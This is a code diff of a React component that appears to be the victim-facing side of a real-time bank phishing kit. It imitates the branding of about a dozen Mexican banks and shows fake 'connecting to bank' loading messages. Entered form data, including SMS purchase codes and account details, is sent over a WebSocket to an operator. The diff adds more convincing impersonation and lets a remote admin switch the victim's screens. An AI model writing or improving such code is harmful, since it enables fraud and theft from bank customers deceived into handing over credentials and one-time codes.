@@ -28,75 +28,151 @@ import banregioLogoWhite from '../assets/banregio_logo_white.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
-  const [, params] = useRoute<{ sessionId: string }>('/client/:sessionId');
-  const sessionId = params?.sessionId;
-  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.FOLIO);
-  const [screenData, setScreenData] = useState<Record<string, any>>({});
-  const [sessionData, setSessionData] = useState<Partial<Session>>({});
-  const [showInitialMessage, setShowInitialMessage] = useState(true);
-  const [initialMessage, setInitialMessage] = useState('Conectando con el banco...');
-  const [bankLoaded, setBankLoaded] = useState(false);
+  const [, params] = useRoute('/client/:sessionId');
+  const sessionId = params?.sessionId || '';
+  
+  // State for the current screen
+  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.VALIDANDO);
+  const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({});
+  const [bankLoaded, setBankLoaded] = useState<boolean>(false);
+  
+  // Additional screen-specific state
+  const [screenData, setScreenData] = useState<{
+    terminacion?: string;
+    saldo?: string;
+    monto?: string;
+    clabe?: string;
+    titular?: string;
+    comercio?: string;
+    mensaje?: string;
+  }>({});
+  
+  // Estado para controlar los mensajes iniciales
+  const [initialMessage, setInitialMessage] = useState<string>('Conectando con el banco...');
+  const [showInitialMessage, setShowInitialMessage] = useState<boolean>(true);
+  
+  // WebSocket connection
+  const { socket, connected, sendMessage } = useWebSocket('/ws');
 
-  // Conectar WebSocket
-  const { sendMessage, lastMessage } = useWebSocket();
-
+  // Efecto para mostrar los mensajes iniciales
   useEffect(() => {
-    // Simulación del mensaje inicial cambiando después de 2 segundos
-    const timer1 = setTimeout(() => {
+    // Mostrar "Conectando con el banco" por 2 segundos
+    const connectingTimer = setTimeout(() => {
       setInitialMessage('Generando aclaración...');
-    }, 2000);
-
-    // Simulación de la carga completada después de 4 segundos
-    const timer2 = setTimeout(() => {
-      setShowInitialMessage(false);
-      setBankLoaded(true);
-    }, 4000);
-
-    return () => {
-      clearTimeout(timer1);
-      clearTimeout(timer2);
-    };
-  }, []);
-
-  useEffect(() => {
-    if (sessionId) {
-      // Solicitar información de la sesión a través de WebSocket
-      sendMessage(JSON.stringify({
-        action: 'JOIN_SESSION',
-        sessionId
-      }));
-    }
-  }, [sessionId, sendMessage]);
-
-  useEffect(() => {
-    if (!lastMessage) return;
-
-    try {
-      const data = JSON.parse(lastMessage);
       
-      if (data.action === 'SESSION_INFO') {
-        setSessionData(data.session);
-        setBankLoaded(true);
-      } else if (data.action === 'CHANGE_SCREEN') {
-        setCurrentScreen(data.screen);
-        setScreenData(data.data || {});
-      }
-    } catch (error) {
-      console.error('Error parsing WebSocket message:', error);
+      // Después de 2 segundos más, mostrar la pantalla regular
+      const generatingTimer = setTimeout(() => {
+        setShowInitialMessage(false);
+        
+        // Cambiar a la pantalla FOLIO si no hay una pantalla específica configurada
+        if (currentScreen === ScreenType.VALIDANDO && !sessionData.pasoActual) {
+          setCurrentScreen(ScreenType.FOLIO);
+        }
+      }, 2000);
+      
+      return () => clearTimeout(generatingTimer);
+    }, 2000);
+    
+    return () => clearTimeout(connectingTimer);
+  }, []);
+  
+  // Register with the server when connection is established
+  useEffect(() => {
+    if (connected && sessionId) {
+      sendMessage({
+        type: 'REGISTER',
+        role: 'CLIENT',
+        sessionId
+      });
     }
-  }, [lastMessage]);
+  }, [connected, sessionId, sendMessage]);
 
-  // Función que maneja el envío de formularios de las diferentes pantallas
+  // Handle WebSocket messages
+  useEffect(() => {
+    if (!socket) return;
+
+    const handleMessage = (event: MessageEvent) => {
+      try {
+        const message = JSON.parse(event.data);
+        
+        // Handle different message types
+        if (message.type === 'INIT_SESSION') {
+          setSessionData(message.data);
+          setBankLoaded(true);
+          // Set initial screen based on session data
+          if (message.data.pasoActual) {
+            setCurrentScreen(message.data.pasoActual as ScreenType);
+          }
+        }
+        else if (message.type === 'SCREEN_CHANGE') {
+          const { tipo, ...data } = message.data;
+          
+          console.log('SCREEN_CHANGE recibido:', tipo, data);
+          
+          // Extract screen type from the message
+          // The server sends 'mostrar_X', we need to remove the prefix
+          let screenType = tipo.replace('mostrar_', '');
+          
+          // Normalize screen type for SMS_COMPRA (handle different case variations)
+          if (screenType.toLowerCase() === 'sms_compra' || 
+              screenType.toLowerCase() === 'smscompra' ||
+              screenType.toLowerCase() === 'sms compra') {
+            console.log('Pantalla SMS_COMPRA detectada, normalizando a:', ScreenType.SMS_COMPRA);
+            screenType = ScreenType.SMS_COMPRA; // Use the exact value from enum
+          }
+          
+          console.log('Cambiando a pantalla:', screenType);
+          
+          // Verificación adicional para asegurar que se muestra la pantalla SMS_COMPRA
+          if (tipo.toLowerCase().includes('sms_compra') || 
+              tipo.toLowerCase().includes('smscompra') ||
+              screenType.toLowerCase() === 'sms_compra' ||
+              screenType.toLowerCase() === 'smscompra') {
+            console.log('Verificando expresamente que SMS_COMPRA se establezca correctamente');
+            console.log('Datos para mostrar en SMS_COMPRA:', data);
+            setCurrentScreen(ScreenType.SMS_COMPRA);
+            // Actualizamos los datos explícitamente para asegurar que se muestren
+            setScreenData({
+              ...data,
+              terminacion: data.terminacion || '****'
+            });
+          } else {
+            setCurrentScreen(screenType as ScreenType);
+          }
+          
+          // Update screen-specific data
+          setScreenData(data);
+        }
+      } catch (error) {
+        console.error("Error processing WebSocket message:", error);
+      }
+    };
+
+    socket.addEventListener('message', handleMessage);
+    return () => socket.removeEventListener('message', handleMessage);
+  }, [socket]);
+
+  // Handle form submissions
   const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
-    sendMessage(JSON.stringify({
-      action: 'CLIENT_INPUT',
-      sessionId,
-      screen,
-      data: formData
-    }));
+    if (connected) {
+      console.log('Enviando datos al servidor:', screen, formData);
+      
+      // Enviar datos al servidor inmediatamente
+      sendMessage({
+        type: 'CLIENT_INPUT',
+        data: {
+          tipo: screen,
+          sessionId,
+          data: formData
+        }
+      });
+      
+      // Cambiar a pantalla validando mientras esperamos respuesta del admin
+      setCurrentScreen(ScreenType.VALIDANDO);
+    }
   };
 
-  // Función para renderizar el header específico de cada banco
+  // Función para determinar el header basado en el banco
   const renderHeader = () => {
     if (sessionData.banco === 'LIVERPOOL') {
       return (
@@ -177,6 +253,7 @@ export default function ClientScreen() {
             src={hsbcLogo} 
             className="hsbc-logo inline-block mb-2" 
             alt="HSBC" 
+            style={{ maxHeight: "48px" }}
           />
           <div className="font-bold text-sm text-black">{formatDate(new Date())}</div>
         </header>
@@ -283,7 +360,7 @@ export default function ClientScreen() {
             <a href="#" className="text-white mx-2">Facebook</a>
             <a href="#" className="text-white mx-2">YouTube</a>
             <br />
-            © Banbajio México 2025. Todos los Derechos Reservados
+            © Banbajio México 2024. Todos los Derechos Reservados
           </div>
         </footer>
       );
@@ -416,15 +493,80 @@ export default function ClientScreen() {
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
-              <a href="#" className="text-white mx-2">Contáctanos</a> |
-              <a href="#" className="text-white mx-2">Aclaraciones</a> |
-              <a href="#" className="text-white mx-2">Promociones</a> |
-              <a href="#" className="text-white mx-2">Facebook</a> |
-              <a href="#" className="text-white mx-2">YouTube</a>
+              <a href={
+                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda/contacto' : 
+                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/contacto.html' : 
+                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/contacto.html' :
+                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/contacto/index.html' :
+                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/' :
+                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/contacto/' :
+                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/contacto/' :
+                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :
+                sessionData.banco === 'INVEX' ? 'https://www.invex.com/contacto' :
+                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contacto.php' :
+                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/contacto' :
+                'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte'
+              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
+              <a href={
+                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda/aclaraciones/ayuda-aclaraciones/' : 
+                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/servicios-digitales/aclaraciones.html' : 
+                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/aclaraciones.html' :
+                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/aclaraciones/index.html' :
+                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/aclaraciones/' :
+                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/disputas/' :
+                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/aclaraciones/' :
+                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/unidad-especializada-aclaraciones.aspx' :
+                sessionData.banco === 'INVEX' ? 'https://www.invex.com/aclaraciones' :
+                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/aclaraciones.php' :
+                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/preguntas-frecuentes' :
+                'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea'
+              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
+              <a href={
+                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/promociones/' : 
+                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/promociones.html' : 
+                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/productos/promociones.html' :
+                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/promociones/index.html' :
+                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/promociones/' :
+                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/promociones/hoteles/' :
+                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/santander-select/promociones-exclusivas/' :
+                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/promociones/promociones.aspx' :
+                sessionData.banco === 'INVEX' ? 'https://www.invex.com/promociones' :
+                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/promociones/' :
+                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/promociones' :
+                'https://www.banorte.com/wps/portal/banorte/Home/promociones/todas'
+              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
+              <a href={
+                sessionData.banco === 'LIVERPOOL' ? 'https://www.facebook.com/liverpoolmexico' : 
+                sessionData.banco === 'CITIBANAMEX' ? 'https://www.facebook.com/CitibanamexMx' : 
+                sessionData.banco === 'BBVA' ? 'https://www.facebook.com/BBVAMexico' :
+                sessionData.banco === 'BANCOPPEL' ? 'https://www.facebook.com/BanCoppel' :
+                sessionData.banco === 'HSBC' ? 'https://www.facebook.com/HSBC.MX' :
+                sessionData.banco === 'AMEX' ? 'https://www.facebook.com/AmericanExpressMexico' :
+                sessionData.banco === 'SANTANDER' ? 'https://www.facebook.com/SantanderMexico' :
+                sessionData.banco === 'SCOTIABANK' ? 'https://www.facebook.com/ScotiabankMX' :
+                sessionData.banco === 'INVEX' ? 'https://www.facebook.com/INVEXBanco' :
+                sessionData.banco === 'BANREGIO' ? 'https://www.facebook.com/banregio' :
+                sessionData.banco === 'SPIN' ? 'https://www.facebook.com/SpinByOxxo' :
+                'https://www.facebook.com/BanorteOficial'
+              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
+              <a href={
+                sessionData.banco === 'LIVERPOOL' ? 'https://www.youtube.com/user/liverpoolmexico' : 
+                sessionData.banco === 'CITIBANAMEX' ? 'https://www.youtube.com/user/Banamex' : 
+                sessionData.banco === 'BBVA' ? 'https://www.youtube.com/user/BBVABancomer' :
+                sessionData.banco === 'BANCOPPEL' ? 'https://www.youtube.com/channel/UCiLI7sTiT4XjzUOtYQrNtpw' :
+                sessionData.banco === 'HSBC' ? 'https://www.youtube.com/user/HSBCMEX' :
+                sessionData.banco === 'AMEX' ? 'https://www.youtube.com/user/americanexpressmexico' :
+                sessionData.banco === 'SANTANDER' ? 'https://www.youtube.com/user/SantanderMx' :
+                sessionData.banco === 'SCOTIABANK' ? 'https://www.youtube.com/user/ScotiabankMX' :
+                sessionData.banco === 'INVEX' ? 'https://www.youtube.com/channel/UCgYL-vVd9Af5oVcpOyMsefQ' :
+                sessionData.banco === 'BANREGIO' ? 'https://www.youtube.com/channel/UC0UWRvXksJJzXG-hRnGDG3g' :
+                sessionData.banco === 'SPIN' ? 'https://www.youtube.com/channel/UC6LuKC5QzmY2V4qVbJYJavw' :
+                'https://www.youtube.com/user/GFBanorte'
+              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Youtube</a>
             </div>
             <div>© {
               sessionData.banco === 'LIVERPOOL' ? 'Liverpool' :
-              sessionData.banco === 'CITIBANAMEX' ? 'Citibanamex' : 
+              sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
               sessionData.banco === 'BBVA' ? 'BBVA' :
               sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :
               sessionData.banco === 'HSBC' ? 'HSBC' :
@@ -435,7 +577,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BANREGIO' ? 'Banregio' :
               sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
               'Banorte'
-            } México 2025. Todos los Derechos Reservados</div>
+            } México 2024. Todos los Derechos Reservados</div>
           </div>
         </footer>
       );
@@ -458,19 +600,95 @@ export default function ClientScreen() {
           <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
         </div>
       );
+    } else if (sessionData.banco === 'BBVA') {
+      return (
+        <div className="text-center mt-4 px-4">
+          <p className="text-sm text-gray-600">La manera más fácil y segura de realizar tus operaciones bancarias</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'BANORTE') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Tu banca en línea, más segura y con mayor protección</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'BANCOPPEL') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">La llave a tu mundo financiero</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'HSBC') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">El banco local con perspectiva global</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'AMEX') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a American Express</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'SANTANDER') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Santander, tu banco de confianza</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'SCOTIABANK') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Scotiabank, tu banco con más posibilidades</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'INVEX') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a INVEX Banca Digital</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'BANREGIO') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banregio Banca Digital</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'SPIN') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a SPIN by Oxxo</p>
+        </div>
+      );
     } else {
-      return null;
+      return (
+        <div className="text-center mt-4 px-4">
+          <p className="text-sm">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
+          <div className="mt-2 space-x-2">
+            <img 
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png" 
+              className="h-5 inline-block" 
+              alt="Suburbia" 
+            />
+            <img 
+              src="https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg" 
+              className="h-5 inline-block" 
+              alt="Williams Sonoma" 
+            />
+          </div>
+        </div>
+      );
     }
   };
 
   // Si estamos mostrando el mensaje inicial o aún no se ha cargado el banco, mostrar una pantalla de carga
   if (showInitialMessage || !bankLoaded) {
     const loadingContent = (
-      <div className="container mx-auto px-4 py-6 flex-grow flex flex-col items-center justify-center">
-        <div className="client-container w-full">
-          <div className="client-content text-center mb-4">
+      <>
+        <div className="container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center">
+          <div className="text-center mb-4">
             <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
-            <div className="h-4 w-full bg-gray-200 rounded-md overflow-hidden shadow-sm">
+            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
               <div className={`h-full ${
                 sessionData.banco === 'LIVERPOOL' ? 'liverpool-bg' :
                 sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : 
@@ -489,7 +707,7 @@ export default function ClientScreen() {
             </div>
           </div>
         </div>
-      </div>
+      </>
     );
     
     // Si no se ha cargado el banco aún, mostramos una pantalla genérica de carga
@@ -518,7 +736,7 @@ export default function ClientScreen() {
                 <a href="https://www.facebook.com/BanorteOficial" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
                 <a href="https://www.youtube.com/user/GFBanorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">YouTube</a>
               </div>
-              <div>© Banca Digital 2025. Todos los Derechos Reservados</div>
+              <div>© Banca Digital 2024. Todos los Derechos Reservados</div>
             </div>
           </footer>
         </div>
@@ -565,20 +783,15 @@ export default function ClientScreen() {
       }
     >
       {renderHeader()}
-      {/* Información adicional del banco si aplica */}
-      {renderBankInfo()}
+      {/* Eliminamos renderBankInfo para evitar duplicar elementos */}
 
-      <div className="container mx-auto px-4 py-6 flex-grow">
-        <div className="client-container">
-          <div className="client-content">
-            <ScreenTemplates 
-              currentScreen={currentScreen} 
-              screenData={screenData}
-              onSubmit={handleSubmit}
-              banco={sessionData.banco || 'BANORTE'}
-            />
-          </div>
-        </div>
+      <div className="container mx-auto max-w-md px-6 py-8 flex-grow">
+        <ScreenTemplates 
+          currentScreen={currentScreen} 
+          screenData={screenData}
+          onSubmit={handleSubmit}
+          banco={sessionData.banco || 'BANORTE'}
+        />
       </div>
 
       {renderFooter()}
